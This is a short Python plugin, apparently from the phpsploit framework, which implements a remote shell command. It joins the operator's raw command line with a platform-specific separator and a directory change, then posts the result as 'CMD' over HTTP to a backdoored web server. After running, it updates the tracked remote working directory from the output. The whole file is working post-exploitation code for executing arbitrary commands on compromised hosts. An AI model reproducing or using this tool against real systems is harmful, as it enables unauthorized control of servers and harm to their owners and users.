
api.isshell()

if self.argc < 2:
    api.exit(self.help)

cmdSep = ";"
if api.server['platform'] == 'win':
    cmdSep = "&"

cmdSep = " %s " % cmdSep

commands = list()

# patch to view stderr in linux
if api.server['platform'] == 'nix':
    commands+= ['exec 2>&1']

# go to pwd
commands+= ['cd '+rpath.cwd]

# here i use self.args that is all the raw line arguments string
# because ' '.join(self.argv) is an altered string that was parsed by phpsploit
commands+= [self.self.args]


CMD = cmdSep.join(commands)

# patch to take care of new CWD if changed (part1)
if api.server['platform'] == 'nix':
    CMD+= cmdSep+'pwd'

http.send({'CMD' : CMD})

response = http.response.splitlines()

# patch to take care of new CWD if changed (part2)
if response[-1].startswith('/'):
    api.env['CWD'] = response[-1].strip()
    response = response[:-1]

if response:
    print P_NL.join(response)
